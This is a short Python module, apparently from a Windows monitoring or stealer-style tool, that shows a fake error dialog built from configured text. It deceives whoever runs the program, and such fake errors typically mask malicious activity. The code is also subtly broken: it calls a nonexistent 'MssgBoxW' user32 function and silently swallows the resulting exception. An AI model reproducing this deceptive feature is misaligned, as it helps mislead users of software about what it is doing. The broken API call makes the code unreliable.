from ctypes import windll

from systoring.windowsmonitoring.helpers.config import MssgConfig


class Mssg:
    def __init__(self):

        self.__config = MssgConfig()

    def __create_Mssg_window(self) -> None:
        """
        Creates a fake error window.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.user32.MssgBoxW(0, self.__config.MssgDescription, self.__config.MssgTitle, 0x10)

    def run(self) -> None:
        """
        Launches the fake error window module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_Mssg_window()

        except Exception as e:
            pass
